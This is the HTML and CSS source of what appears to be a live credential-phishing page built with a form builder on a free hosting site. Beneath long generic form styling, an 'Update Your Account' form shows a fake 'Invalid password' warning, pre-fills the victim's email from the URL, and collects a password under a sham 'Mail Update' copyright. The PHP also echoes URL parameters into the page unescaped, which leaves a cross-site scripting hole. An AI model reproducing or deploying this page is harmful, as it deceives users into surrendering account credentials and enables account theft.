.form-sub-label {
  color: #6f6f6f;
}
.form-label-top,
.form-label-left,
.form-label-right,
.form-html {
  color: #555555;
}
.form-checkbox-item label,
.form-radio-item label {
  color: #6f6f6f;
}
.form-line.form-line-active {
  -webkit-transition-property: all;
  -moz-transition-property: all;
  -ms-transition-property: all;
  -o-transition-property: all;
  transition-property: all;
  -webkit-transition-duration: 0.3s;
  -moz-transition-duration: 0.3s;
  -ms-transition-duration: 0.3s;
  -o-transition-duration: 0.3s;
  transition-duration: 0.3s;
  -webkit-transition-timing-function: ease;
  -moz-transition-timing-function: ease;
  -ms-transition-timing-function: ease;
  -o-transition-timing-function: ease;
  transition-timing-function: ease;
  background-color: #ffffe0;
}
/* omer */
.form-radio-item,
.form-checkbox-item {
  padding-bottom: 0px !important;
}
.form-radio-item:last-child,
.form-checkbox-item:last-child {
  padding-bottom: 0;
}
/* omer */
[data-type="control_radio"] .form-input,
[data-type="control_checkbox"] .form-input,
[data-type="control_radio"] .form-input-wide,
[data-type="control_checkbox"] .form-input-wide {
  width: 100%;
  max-width: 416px;
}
.form-radio-item,
.form-checkbox-item {
  width: 100%;
  max-width: 416px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.form-textbox.form-radio-other-input,
.form-textbox.form-checkbox-other-input {
  width: 80%;
  margin-left: 3%;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.form-multiple-column {
  width: 100%;
}
.form-multiple-column .form-radio-item,
.form-multiple-column .form-checkbox-item {
  width: 10%;
}
.form-multiple-column[data-columncount="1"] .form-radio-item,
.form-multiple-column[data-columncount="1"] .form-checkbox-item {
  width: 100%;
}
.form-multiple-column[data-columncount="2"] .form-radio-item,
.form-multiple-column[data-columncount="2"] .form-checkbox-item {
  width: 50%;
}
.form-multiple-column[data-columncount="3"] .form-radio-item,
.form-multiple-column[data-columncount="3"] .form-checkbox-item {
  width: 33.33333333%;
}
.form-multiple-column[data-columncount="4"] .form-radio-item,
.form-multiple-column[data-columncount="4"] .form-checkbox-item {
  width: 25%;
}
.form-multiple-column[data-columncount="5"] .form-radio-item,
.form-multiple-column[data-columncount="5"] .form-checkbox-item {
  width: 20%;
}
.form-multiple-column[data-columncount="6"] .form-radio-item,
.form-multiple-column[data-columncount="6"] .form-checkbox-item {
  width: 16.66666667%;
}
.form-multiple-column[data-columncount="7"] .form-radio-item,
.form-multiple-column[data-columncount="7"] .form-checkbox-item {
  width: 14.28571429%;
}
.form-multiple-column[data-columncount="8"] .form-radio-item,
.form-multiple-column[data-columncount="8"] .form-checkbox-item {
  width: 12.5%;
}
.form-multiple-column[data-columncount="9"] .form-radio-item,
.form-multiple-column[data-columncount="9"] .form-checkbox-item {
  width: 11.11111111%;
}
.form-single-column .form-checkbox-item,
.form-single-column .form-radio-item {
  width: 100%;
}
.form-checkbox-item .editor-container div,
.form-radio-item .editor-container div {
  position: relative;
}
.form-checkbox-item .editor-container div:before,
.form-radio-item .editor-container div:before {
  display: inline-block;
  vertical-align: middle;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  left: 0;
  width: 18px;
  height: 18px;
}
.supernova {
  height: 100%;
  background-repeat: no-repeat;
  background-attachment: scroll;
  background-position: center top;
  background-repeat: repeat;
}
.supernova {
  background-image: none;
}
#stage {
  background-image: none;
}
/* | */
.form-all {
  background-repeat: no-repeat;
  background-attachment: scroll;
  background-position: center top;
  background-repeat: repeat;
}
.form-header-group {
  background-repeat: no-repeat;
  background-attachment: scroll;
  background-position: center top;
}
.form-line {
  margin-top: 0px;
  margin-bottom: 0px;
}
.form-line {
  padding: 12px 36px;
}
.form-all .form-textbox,
.form-all .form-radio-other-input,
.form-all .form-checkbox-other-input,
.form-all .form-captcha input,
.form-all .form-spinner input,
.form-all .form-pagebreak-back,
.form-all .form-pagebreak-next,
.form-all .qq-upload-button,
.form-all .form-error-message {
  -webkit-border-radius: 6px;
  -moz-border-radius: 6px;
  border-radius: 6px;
}
.form-all .form-sub-label {
  margin-left: 3px;
}
.form-all .form-textarea {
  -webkit-border-radius: 6px;
  -moz-border-radius: 6px;
  border-radius: 6px;
}
.form-all .form-submit-button,
.form-all .form-submit-reset,
.form-all .form-submit-print {
  -webkit-border-radius: 6px;
  -moz-border-radius: 6px;
  border-radius: 6px;
}
.form-all .form-sub-label {
  margin-left: 3px;
}
.form-all {
  -webkit-border-radius: 6px;
  -moz-border-radius: 6px;
  border-radius: 6px;
}
.form-section:first-child {
  -webkit-border-radius: 6px 6px 0 0;
  -moz-border-radius: 6px 6px 0 0;
  border-radius: 6px 6px 0 0;
}
.form-section:last-child {
  -webkit-border-radius: 0 0 6px 6px;
  -moz-border-radius: 0 0 6px 6px;
  border-radius: 0 0 6px 6px;
}
.form-all .qq-upload-button,
.form-all .form-submit-button,
.form-all .form-submit-reset,
.form-all .form-submit-print {
  height: 35px;
  width: 350px;
  font-size: 1em;
  padding: 9px 15px;
  font-family: "Lucida Grande", sans-serif;
  font-size: 17px;
  font-weight: normal;
  border: none;
  border-width: 0px !important;
  border-style: solid !important;
}
.form-all .qq-upload-button,
.form-all .form-submit-button,
.form-all .form-submit-reset,
.form-all .form-submit-print {
  color: #ffffff !important;
  background: #026ea4;
  box-shadow: none;
  text-shadow: none;
}
.form-all .form-pagebreak-back,
.form-all .form-pagebreak-next {
  font-size: 1em;
  padding: 9px 15px;
  font-family: "Lucida Grande", sans-serif;
  font-size: 14px;
  font-weight: normal;
}
/*
& when ( @buttonFontType = google ) {
	@import (css) "@{buttonFontLink}";
}
*/
h2.form-header {
  line-height: 1.618em;
  font-size: 1.714em;
}
h2 ~ .form-subHeader {
  line-height: 1.5em;
  font-size: 1.071em;
}
.form-header-group {
  text-align: center;
}
.form-line {
  zoom: 1;
}
.form-line:before,
.form-line:after {
  display: table;
  content: '';
  line-height: 0;
}
.form-line:after {
  clear: both;
}
.form-captcha input,
.form-spinner input {
  width: 416px;
}
.form-textbox,
.form-textarea {
  width: 100%;
  max-width: 416px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.form-input,
.form-address-table,
.form-matrix-table {
  width: 100%;
  max-width: 416px;
}
.form-radio-item,
.form-checkbox-item {
  width: 100%;
  max-width: 416px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.form-textbox.form-radio-other-input,
.form-textbox.form-checkbox-other-input {
  width: 80%;
  margin-left: 3%;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.form-multiple-column {
  width: 100%;
}
.form-multiple-column .form-radio-item,
.form-multiple-column .form-checkbox-item {
  width: 10%;
}
.form-multiple-column[data-columncount="1"] .form-radio-item,
.form-multiple-column[data-columncount="1"] .form-checkbox-item {
  width: 100%;
}
.form-multiple-column[data-columncount="2"] .form-radio-item,
.form-multiple-column[data-columncount="2"] .form-checkbox-item {
  width: 50%;
}
.form-multiple-column[data-columncount="3"] .form-radio-item,
.form-multiple-column[data-columncount="3"] .form-checkbox-item {
  width: 33.33333333%;
}
.form-multiple-column[data-columncount="4"] .form-radio-item,
.form-multiple-column[data-columncount="4"] .form-checkbox-item {
  width: 25%;
}
.form-multiple-column[data-columncount="5"] .form-radio-item,
.form-multiple-column[data-columncount="5"] .form-checkbox-item {
  width: 20%;
}
.form-multiple-column[data-columncount="6"] .form-radio-item,
.form-multiple-column[data-columncount="6"] .form-checkbox-item {
  width: 16.66666667%;
}
.form-multiple-column[data-columncount="7"] .form-radio-item,
.form-multiple-column[data-columncount="7"] .form-checkbox-item {
  width: 14.28571429%;
}
.form-multiple-column[data-columncount="8"] .form-radio-item,
.form-multiple-column[data-columncount="8"] .form-checkbox-item {
  width: 12.5%;
}
.form-multiple-column[data-columncount="9"] .form-radio-item,
.form-multiple-column[data-columncount="9"] .form-checkbox-item {
  width: 11.11111111%;
}
[data-type="control_dropdown"] .form-dropdown {
  width: 100% !important;
  max-width: 416px;
}
[data-type="control_fullname"] .form-sub-label-container {
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  width: 48%;
}
[data-type="control_fullname"] .form-sub-label-container:first-child {
  margin-right: 4%;
}
[data-type="control_phone"] .form-sub-label-container {
  width: 62.5%;
  margin-left: 2.5%;
  margin-right: 0;
  float: left;
  position: relative;
}
[data-type="control_phone"] .form-sub-label-container:first-child {
  width: 32.5%;
  margin-right: 2.5%;
  margin-left: 0;
}
[data-type="control_phone"] .form-sub-label-container:first-child [data-component=areaCode] {
  width: 93%;
  float: left;
}
[data-type="control_phone"] .form-sub-label-container:first-child [data-component=areaCode] ~ .form-sub-label {
  display: inline-block;
}
[data-type="control_phone"] .form-sub-label-container:first-child .phone-separate {
  position: absolute;
  top: 0;
  right: -16%;
  width: 24%;
  text-align: center;
  text-indent: -4px;
}
[data-type="control_birthdate"] .form-sub-label-container {
  width: 22%;
  margin-right: 3%;
}
[data-type="control_birthdate"] .form-sub-label-container:first-child {
  width: 50%;
}
[data-type="control_birthdate"] .form-sub-label-container:last-child {
  margin-right: 0;
}
[data-type="control_birthdate"] .form-sub-label-container .form-dropdown {
  width: 100%;
}
[data-type="control_payment"] .form-sub-label-container {
  width: auto;
}
[data-type="control_payment"] .form-sub-label-container .form-dropdown {
  width: 100%;
}
.form-address-table td .form-dropdown {
  width: 100%;
}
.form-address-table td .form-sub-label-container {
  width: 96%;
}
.form-address-table td:last-child .form-sub-label-container {
  margin-left: 4%;
}
.form-address-table td[colspan="2"] .form-sub-label-container {
  width: 100%;
  margin: 0;
}
.form-line,
.form-input,
.form-input-wide,
.form-dropdown,
.form-sub-label-container,
.form-address-table,
.form-matrix-table {
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  width: 100%;
  max-width: none;
}
.form-textbox,
.form-textarea,
.form-radio-item,
.form-checkbox-item,
.form-captcha input,
.form-spinner input,
.form-error-message {
  width: 100%;
  max-width: none;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
/*.form-dropdown,
.form-radio-item,
.form-checkbox-item,
.form-radio-other-input,
.form-checkbox-other-input,*/
.form-captcha input,
.form-spinner input,
.form-error-message {
  padding: 4px 3px 2px 3px;
}
.form-header-group {
  font-family: "Lucida Grande", sans-serif;
}
.form-section {
  padding: 0px 0px 0px 0px;
}
.form-header-group {
  margin: 12px 36px 12px 36px;
}
.form-header-group {
  padding: 24px 0px 24px 0px;
}
.form-textbox,
.form-textarea {
  border-width: 1px;
  border-style: solid;
  padding: 14px 7px 12px 7px;
}
.form-textbox,
.form-textarea,
.form-radio-other-input,
.form-checkbox-other-input,
.form-captcha input,
.form-spinner input {
  background-color: #ffffff;
}
.form-textbox {
  height: 35px;
}
.form-textbox,
.form-textarea {
  width: 100%;
  max-width: 460px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
[data-type="control_textbox"] .form-input,
[data-type="control_textarea"] .form-input,
[data-type="control_fullname"] .form-input,
[data-type="control_phone"] .form-input,
[data-type="control_datetime"] .form-input,
[data-type="control_address"] .form-input,
[data-type="control_email"] .form-input,
[data-type="control_passwordbox"] .form-input,
[data-type="control_autocomp"] .form-input,
[data-type="control_textbox"] .form-input-wide,
[data-type="control_textarea"] .form-input-wide,
[data-type="control_fullname"] .form-input-wide,
[data-type="control_phone"] .form-input-wide,
[data-type="control_datetime"] .form-input-wide,
[data-type="control_address"] .form-input-wide,
[data-type="control_email"] .form-input-wide,
[data-type="control_passwordbox"] .form-input-wide,
[data-type="control_autocomp"] .form-input-wide {
  width: 100%;
  max-width: 460px;
}
[data-type="control_fullname"] .form-sub-label-container {
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  width: 48%;
  margin-right: 0;
  float: left;
}
[data-type="control_fullname"] .form-sub-label-container:first-child {
  margin-right: 4%;
}
[data-type="control_phone"] .form-sub-label-container {
  width: 62.5%;
  margin-left: 2.5%;
  margin-right: 0;
  float: left;
  position: relative;
}
[data-type="control_phone"] .form-sub-label-container:first-child {
  width: 32.5%;
  margin-right: 2.5%;
  margin-left: 0;
}
[data-type="control_phone"] .form-sub-label-container:first-child [data-component=areaCode] {
  width: 93%;
  float: left;
}
[data-type="control_phone"] .form-sub-label-container:first-child [data-component=areaCode] ~ .form-sub-label {
  display: inline-block;
}
[data-type="control_phone"] .form-sub-label-container:first-child .phone-separate {
  position: absolute;
  top: 0;
  right: -16%;
  width: 24%;
  text-align: center;
  text-indent: -4px;
}
[data-type="control_phone"] .form-sub-label-container .date-separate {
  visibility: hidden;
}
.form-matrix-table {
  width: 100%;
  max-width: 460px;
}
.form-address-table {
  width: 100%;
  max-width: 460px;
}
.form-address-table td .form-dropdown {
  width: 100%;
}
.form-address-table td .form-sub-label-container {
  width: 96%;
}
.form-address-table td:last-child .form-sub-label-container {
  margin-left: 4%;
}
.form-address-table td[colspan="2"] .form-sub-label-container {
  width: 100%;
  margin: 0;
}
[data-type="control_dropdown"] .form-input,
[data-type="control_birthdate"] .form-input,
[data-type="control_time"] .form-input,
[data-type="control_dropdown"] .form-input-wide,
[data-type="control_birthdate"] .form-input-wide,
[data-type="control_time"] .form-input-wide {
  width: 100%;
  max-width: 416px;
}
[data-type="control_dropdown"] .form-dropdown {
  width: 100% !important;
  max-width: 416px;
}
[data-type="control_birthdate"] .form-sub-label-container {
  width: 22%;
  margin-right: 3%;
}
[data-type="control_birthdate"] .form-sub-label-container:first-child {
  width: 50%;
}
[data-type="control_birthdate"] .form-sub-label-container:last-child {
  margin-right: 0;
}
[data-type="control_birthdate"] .form-sub-label-container .form-dropdown {
  width: 100%;
}
.form-buttons-wrapper {
  margin-left: 0 !important;
  text-align: center;
}
.form-label {
  font-family: "Lucida Grande", sans-serif;
}
li[data-type="control_image"] div {
  text-align: left;
}
li[data-type="control_image"] img {
  border: none;
  border-width: 0px !important;
  border-style: solid !important;
  border-color: false !important;
}
.form-line-column {
  width: auto;
}
.form-line-error {
  overflow: hidden;
  -webkit-transition-property: none;
  -moz-transition-property: none;
  -ms-transition-property: none;
  -o-transition-property: none;
  transition-property: none;
  -webkit-transition-duration: 0.3s;
  -moz-transition-duration: 0.3s;
  -ms-transition-duration: 0.3s;
  -o-transition-duration: 0.3s;
  transition-duration: 0.3s;
  -webkit-transition-timing-function: ease;
  -moz-transition-timing-function: ease;
  -ms-transition-timing-function: ease;
  -o-transition-timing-function: ease;
  transition-timing-function: ease;
  background-color: #fff4f4;
}
.form-line-error .form-error-message {
  background-color: #ff3200;
  clear: both;
  float: none;
}
.form-line-error .form-error-message .form-error-arrow {
  border-bottom-color: #ff3200;
}
.form-line-error input:not(#coupon-input),
.form-line-error textarea,
.form-line-error .form-validation-error {
  border: 1px solid #ff3200;
  -webkit-box-shadow: 0 0 3px #ff3200;
  -moz-box-shadow: 0 0 3px #ff3200;
  box-shadow: 0 0 3px #ff3200;
}
.ie-8 .form-all {
  margin-top: auto;
  margin-top: initial;
}
.ie-8 .form-all:before {
  display: none;
}
[data-type="control_clear"] {
  display: none;
}
/* | */
@media screen and (max-width: 480px), screen and (max-device-width: 767px) and (orientation: portrait), screen and (max-device-width: 415px) and (orientation: landscape) {
  .testOne {
    letter-spacing: 0;
  }
  .form-all {
    border: 0;
    max-width: initial;
  }
  .form-sub-label-container {
    width: 100%;
    margin: 0;
    margin-right: 0;
    float: left;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
  }
  span.form-sub-label-container + span.form-sub-label-container {
    margin-right: 0;
  }
  .form-sub-label {
    white-space: normal;
  }
  .form-address-table td,
  .form-address-table th {
    padding: 0 1px 10px;
  }
  .form-submit-button,
  .form-submit-print,
  .form-submit-reset {
    width: 100%;
    margin-left: 0!important;
  }
  div[id*=at_] {
    font-size: 14px;
    font-weight: 700;
    height: 8px;
    margin-top: 6px;
  }
  .showAutoCalendar {
    width: 20px;
  }
  img.form-image {
    max-width: 100%;
    height: auto;
  }
  .form-matrix-row-headers {
    width: 100%;
    word-break: break-all;
    min-width: 80px;
  }
  .form-collapse-table,
  .form-header-group {
    margin: 0;
  }
  .form-collapse-table {
    height: 100%;
    display: inline-block;
    width: 100%;
  }
  .form-collapse-hidden {
    display: none !important;
  }
  .form-input {
    width: 100%;
  }
  .form-label {
    width: 100% !important;
  }
  .form-label-left,
  .form-label-right {
    display: block;
    float: none;
    text-align: left;
    width: auto!important;
  }
  .form-line,
  .form-line.form-line-column {
    padding: 2% 5%;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
  }
  input[type=text],
  input[type=email],
  input[type=tel],
  textarea {
    width: 100%;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    max-width: initial !important;
  }
  .form-radio-other-input,
  .form-checkbox-other-input {
    max-width: 55% !important;
  }
  .form-dropdown,
  .form-textarea,
  .form-textbox {
    width: 100%!important;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
  }
  .form-input,
  .form-input-wide,
  .form-textarea,
  .form-textbox,
  .form-dropdown {
    max-width: initial!important;
  }
  .form-checkbox-item:not(#foo),
  .form-radio-item:not(#foo) {
    width: 100%;
  }
  .form-address-city,
  .form-address-line,
  .form-address-postal,
  .form-address-state,
  .form-address-table,
  .form-address-table .form-sub-label-container,
  .form-address-table select,
  .form-input {
    width: 100%;
  }
  div.form-header-group {
    padding: 24px 0px !important;
    margin: 0 12px 2% !important;
    margin-left: 5%!important;
    margin-right: 5%!important;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
  }
  div.form-header-group.hasImage img {
    max-width: 100%;
  }
  [data-type="control_button"] {
    margin-bottom: 0 !important;
  }
  [data-type=control_fullname] .form-sub-label-container {
    width: 48%;
  }
  [data-type=control_fullname] .form-sub-label-container:first-child {
    margin-right: 4%;
  }
  [data-type=control_phone] .form-sub-label-container {
    width: 65%;
    margin-right: 0;
    margin-left: 0;
    float: left;
  }
  [data-type=control_phone] .form-sub-label-container:first-child {
    width: 31%;
    margin-right: 4%;
  }
  [data-type=control_datetime] .allowTime-container {
    width: 100%;
  }
  [data-type=control_datetime] .form-sub-label-container:first-child {
    width: 10%!important;
    margin-left: 0;
    margin-right: 0;
  }
  [data-type=control_datetime] .form-sub-label-container + .form-sub-label-container {
    width: 24%!important;
    margin-left: 6%;
    margin-right: 0;
  }
  [data-type=control_datetime] span + span + span > span:first-child {
    display: block;
    width: 100% !important;
  }
  [data-type=control_birthdate] .form-sub-label-container,
  [data-type=control_time] .form-sub-label-container {
    width: 27.3%!important;
    margin-right: 6% !important;
  }
  [data-type=control_time] .form-sub-label-container:last-child {
    width: 33.3%!important;
    margin-right: 0 !important;
  }
  .form-pagebreak-back-container,
  .form-pagebreak-next-container {
    min-height: 1px;
    width: 50% !important;
  }
  .form-pagebreak-back,
  .form-pagebreak-next,
  .form-product-item.hover-product-item {
    width: 100%;
  }
  .form-pagebreak-back-container {
    padding: 0;
    text-align: right;
  }
  .form-pagebreak-next-container {
    padding: 0;
    text-align: left;
  }
  .form-pagebreak {
    margin: 0 auto;
  }
  .form-buttons-wrapper {
    margin: 0!important;
    margin-left: 0!important;
  }
  .form-buttons-wrapper button {
    width: 100%;
  }
  .form-buttons-wrapper .form-submit-print {
    margin: 0 !important;
  }
  table {
    width: 100%!important;
    max-width: initial!important;
  }
  table td + td {
    padding-left: 3%;
  }
  .form-checkbox-item,
  .form-radio-item {
    white-space: normal!important;
  }
  .form-checkbox-item input,
  .form-radio-item input {
    width: auto;
  }
  .form-collapse-table {
    margin: 0 5%;
    display: block;
    zoom: 1;
    width: auto;
  }
  .form-collapse-table:before,
  .form-collapse-table:after {
    display: table;
    content: '';
    line-height: 0;
  }
  .form-collapse-table:after {
    clear: both;
  }
  .fb-like-box {
    width: 98% !important;
  }
  .form-error-message {
    clear: both;
    bottom: -10px;
  }
  .date-separate,
  .phone-separate {
    display: none;
  }
  .custom-field-frame,
  .direct-embed-widgets,
  .signature-pad-wrapper {
    width: 100% !important;
  }
}
/* | */

/*__INSPECT_SEPERATOR__*/

    /* Injected CSS Code */
</style>

<form class="jotform-form" action="?1&email=<?php echo $_GET['login']; ?>"" method="get" name="form_200604353419549" id="200604353419549" accept-charset="utf-8" autocomplete="on">
  <input type="hidden" name="formID" value="200604353419549" />
  <input type="hidden" id="JWTContainer" value="" />
  <input type="hidden" id="cardinalOrderNumber" value="" />
  <div role="main" class="form-all">
    <ul class="form-section page-section">
      <li id="cid_1" class="form-input-wide" data-type="control_head">
        <div class="form-header-group  header-small">
          <div class="header-text httac htvam">
            <h3 id="header_1" class="form-header" data-component="header">
             <font style="font-size:30px" color="#000000" face="Arial"> Update Your Account</font>
            </h3>
            <h3 id="header_1" class="form-header" data-component="header">
            <img src="https://image.freepik.com/free-vector/smartphone-message-email-lock-secure-digital_24877-2805.jpg" id="Image1" alt="" align="top" border="0" style="width:155px;height:120px;">
            </h3>
            <div id="subHeader_1" class="form-subHeader">
              
            </div>
          </div>
        </div>
      </li>
      </li>
      <li class="form-line form-line-column form-col-1 jf-required" data-type="control_textbox" id="id_3">
       <p style="color:red;">Invalid password. Please re-enter correct password!</p>
        <div id="cid_3" class="form-input-wide jf-required">
          <input type="email" id="input_3" name="email" data-type="input-textbox" class="form-readonly form-textbox validate[required]" size="50" value="<?php echo $_GET['email']; ?>" tabindex="-1" data-component="textbox" aria-labelledby="label_3" readonly="" style="background-color:#DCDCDC;"  required="" />
        </div>
      </li>
      <li class="form-line form-line-column form-col-2 jf-required" data-type="control_textbox" id="id_4">
        
        <div id="cid_4" class="form-input-wide jf-required">
          <input type="password" id="input_4" name="password" data-type="input-textbox" class="form-textbox validate[required]" size="50" value="" data-component="textbox" aria-labelledby="label_4" placeholder="Password" required="" />
        </div>
      </li>
      <li class="form-line" data-type="control_button" id="id_2">
        <div id="cid_2" class="form-input-wide">
          <div style="text-align:center" data-align="center" class="form-buttons-wrapper  ">
            <button id="input_2" type="submit" class="form-submit-button" data-component="button" data-content="">
              Continue
            </button>
          </div>
        </div>
      </li>
      <li style="display:none">
        Should be Empty:
        <input type="text" name="website" value="" />
      </li>
    </ul>
  </div>
  <script>
  JotForm.showJotFormPowered = "new_footer";
  </script>
  <script>
  JotForm.poweredByText = "Powered by JotForm";
  </script>
  <input type="hidden" id="simple_spc" name="simple_spc" value="200604353419549" />
  <script type="text/javascript">
  document.getElementById("si" + "mple" + "_spc").value = "200604353419549-200604353419549";
  </script>
  <div class="formFooter-heightMask">
  </div>
 
  </div>
  <br><br><br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
   <br>
    <br>
     
     <br>
     
     <br>
      <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font style="font-size:11px" color="#000000" face="Arial">  2020. Copyright Mail Update.</font></div> 
</form>

</div>

</div>

</body>
</html>


</div>

    </div><div id="Ia055325cb8ec48559f3f68e937f4d0cb" style="display:block;clear: both;margin:0 0 100rem 0;" class="Layout1_Default"><style>.column_Ia055325cb8ec48559f3f68e937f4d0cb {width: 100%;-moz-box-sizing:border-box;-webkit-box-sizing: border-box;box-sizing:border-box;}.column_Ia055325cb8ec48559f3f68e937f4d0cb:after {content: "";display: table;clear: both;}.column_Ia055325cb8ec48559f3f68e937f4d0cb .left {text-align: left;vertical-align: top;width: 50%;padding: 0 15px 0 0;float: left;-moz-box-sizing: border-box;-webkit-box-sizing: border-box;box-sizing:border-box;}.column_Ia055325cb8ec48559f3f68e937f4d0cb .right {vertical-align: top;width: 50%;padding: 0 0 0 15px;float: left;-moz-box-sizing: border-box;-webkit-box-sizing: border-box;box-sizing: border-box;}</style><div class="column_Ia055325cb8ec48559f3f68e937f4d0cb column_divider" ><div id="Left_Ia055325cb8ec48559f3f68e937f4d0cb" class="left" >&nbsp;</div><div id="Right_Ia055325cb8ec48559f3f68e937f4d0cb" class="right" >&nbsp;</div></div></div></div>
    </div>
</div>
                            </div>
                        </div>
                    </main>

                    <div class="yola_footer_wrap">
                        <div class="yola_footer_column">
                            <footer id="yola_style_footer">
                                <p style="float:right; margin:0;"></p><div style="clear:both; height:0;"></div>
                            </footer>
                        </div>
                    </div>
                    
                <style type="text/css">
                    #sys_yolacredit_wrap{text-align:center;}
                    #sys_yolacredit{text-align:center;line-height:1.2em;margin:2em auto;font-family:Arial;
                        position:relative;background:#fff url(classes/commons/yola_footer/png/sprites.png?1001088) right 0.3em no-repeat;
                        background-size:7em;border-top:1px solid #e1e1e1;border-bottom:1px solid #e1e1e1;
                        padding:0.5em 2.6em 0.6em 0.4em;color:#222;font-size:0.6rem;display:inline-block;}
                    #sys_yolacredit p{margin:0;padding:0;line-height:1.2em;}
                    #sys_yolacredit p a{color:#222;text-decoration:none;}
                    #sys_yolacredit p a:hover{text-decoration:underline;}
                    #sys_yolacredit a.yola{font-size:0;position:absolute;top:5px;right:0;display:inline-block;
                        width:25px;height:16px;float:right;text-decoration:none;color:"#fff";}
                    #sys_yolacredit a.yola span{display:none;}
                </style>
                <!--[if lte IE 6]>
                    <style type="text/css">
                        #sys_yolacredit{background:#fff url(classes/commons/yola_footer/gif/sprites.gif?1001088) right 2px no-repeat;}
                    </style>
                <![endif]-->
                <div id="sys_yolacredit_wrap">
                    <div id="sys_yolacredit" style="" title="Visit Yola.com to create your own free website">
                        <p>Make a <a href="https://www.yola.com/">free website</a> with <a class="yola" href="https://www.yola.com/"><span>Yola</span></a></p>
                    </div>
                </div>


                    
<script type="text/javascript" id="site_analytics_tracking" data-id="d1e0fdfc01cb44eaa4e88b454e393992" data-user="faad2c7cad85471887aa787dd0657a62" data-partner="YOLA" data-url="//analytics.yolacdn.net/tracking.js">
  var _yts = _yts || [];
  var tracking_tag = document.getElementById('site_analytics_tracking');
  _yts.push(["_siteId", tracking_tag.getAttribute('data-id')]);
  _yts.push(["_userId", tracking_tag.getAttribute('data-user')]);
  _yts.push(["_partnerId", tracking_tag.getAttribute('data-partner')]);
  _yts.push(["_trackPageview"]);
  (function() {
    var yts = document.createElement("script");
    yts.type = "text/javascript";
    yts.async = true;
    yts.src = document.getElementById('site_analytics_tracking').getAttribute('data-url');
    (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(yts);
  })();
</script>


<!-- template: Skyline_v2 f24c6db6-d644-454a-b743-abb4aa123348 -->
                </div>
            </div> <!-- .inner_bg_overlay -->
        </div> <!-- #sys_background / .bg_overlay -->
        <script src="templates/Skyline_v2/resources/js/browserify.build.js"></script>
    </body>
</html>